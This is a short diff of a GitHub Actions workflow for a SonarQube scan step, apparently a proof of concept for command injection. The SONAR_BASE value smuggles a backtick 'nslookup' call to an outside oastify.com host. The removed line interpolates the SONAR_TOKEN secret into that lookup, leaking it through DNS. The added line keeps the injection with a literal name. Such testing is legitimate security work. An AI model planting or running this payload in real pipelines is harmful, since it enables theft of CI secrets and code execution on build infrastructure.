@@ -15,7 +15,7 @@ jobs:
           SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
           SONAR_PR_NUM: 666
           SONAR_HEAD: foo
-          SONAR_BASE: foo`nslookup ${SONAR_TOKEN}.w74901mjqxo3phbichctp7d8nztqhg55.oastify.com`bar
+          SONAR_BASE: foo`nslookup SONAR_TOKEN.w74901mjqxo3phbichctp7d8nztqhg55.oastify.com`bar
         with:
           args: >
             -Dsonar.scm.revision=foo
